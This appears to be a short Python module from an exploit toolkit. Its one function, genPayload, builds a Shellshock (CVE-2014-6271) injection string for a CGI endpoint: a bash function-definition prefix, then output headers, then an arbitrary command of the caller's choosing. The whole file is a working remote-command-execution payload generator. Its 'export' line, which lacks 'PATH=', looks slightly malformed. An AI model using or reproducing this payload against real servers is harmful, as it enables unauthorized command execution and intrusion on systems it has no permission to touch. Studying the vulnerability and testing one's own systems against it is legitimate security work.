#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Based on:
Target URL example:  http://<RHOST>:<RPORT>/cgi-bin/cat
"""


def genPayload(cmd):
	"""CVE-2014-6271."""
	payload = '() { :; }; echo "Content-Type: text/html"; echo;'
	payload += 'export /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;'
	payload += cmd

	return payload
